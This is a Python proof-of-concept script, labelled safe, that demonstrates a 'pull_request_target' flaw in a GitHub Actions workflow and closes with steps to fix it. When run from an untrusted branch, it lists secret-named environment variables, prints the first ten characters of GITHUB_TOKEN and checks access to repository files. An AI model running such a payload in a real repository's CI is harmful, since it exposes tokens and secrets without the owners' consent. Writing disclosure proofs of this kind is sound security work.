#!/usr/bin/env python3
# Proof-of-Concept - SAFE DEMONSTRATION
import os
import sys
import json

def main():
    print("=== SECURITY VULNERABILITY PROOF ===")
    print("This script is running from an UNTRUSTED PR branch")
    print()
    
    # 1. Show environment access
    print("1. ENVIRONMENT ACCESS:")
    env_vars = [k for k in os.environ.keys() if 'TOKEN' in k or 'SECRET' in k or 'KEY' in k]
    print(f"   Found {len(env_vars)} sensitive-looking environment variables")
    for var in env_vars:
        value = os.environ.get(var, '')
        print(f"   - {var}: {'[SET]' if value else '[EMPTY]'}")
    
    # 2. Show GITHUB_TOKEN specifically
    print()
    print("2. GITHUB_TOKEN ACCESS:")
    token = os.environ.get('GITHUB_TOKEN')
    if token:
        print(f"   ✓ GITHUB_TOKEN IS ACCESSIBLE")
        print(f"   Token length: {len(token)} chars")
        print(f"   First few chars: {token[:10]}...")
        print(f"   **In a real attack, this token could be stolen**")
    else:
        print("   ✗ GITHUB_TOKEN not found")
    
    # 3. Show file system access
    print()
    print("3. FILE SYSTEM ACCESS:")
    try:
        # Try to access some files
        files_to_check = [
            '.github/workflows/assigner.yml',
            'MAINTAINERS.yml',
            '.git/config'
        ]
        
        for file in files_to_check:
            if os.path.exists(file):
                print(f"   ✓ Can access: {file}")
                if file == '.github/workflows/assigner.yml':
                    with open(file, 'r') as f:
                        content = f.read()
                        if 'pull_request_target' in content:
                            print(f"     Contains vulnerable 'pull_request_target'")
            else:
                print(f"   ✗ Cannot access: {file}")
    except Exception as e:
        print(f"   Error: {e}")
    
    # 4. Show what COULD be done
    print()
    print("4. POTENTIAL MALICIOUS ACTIONS:")
    print("   - Steal repository secrets")
    print("   - Push malicious code to the repo")
    print("   - Modify existing files")
    print("   - Create backdoors")
    print("   - Access sensitive data")
    
    # 5. The fix
    print()
    print("=== HOW TO FIX ===")
    print("In .github/workflows/assigner.yml:")
    print("1. Change 'pull_request_target' to 'pull_request' (Line 4)")
    print("2. OR add: ref: ${{ github.event.pull_request.base.ref }} (Line 25)")
    print("3. Remove: permissions: read-all (Line 15)")
    print("4. Use minimal permissions instead")
    
    print()
    print("=== THIS IS A SAFE DEMONSTRATION ===")
    print("No actual malicious code executed")
    print("Only showing what COULD be done")
    
    return 0

if __name__ == "__main__":
    sys.exit(main())
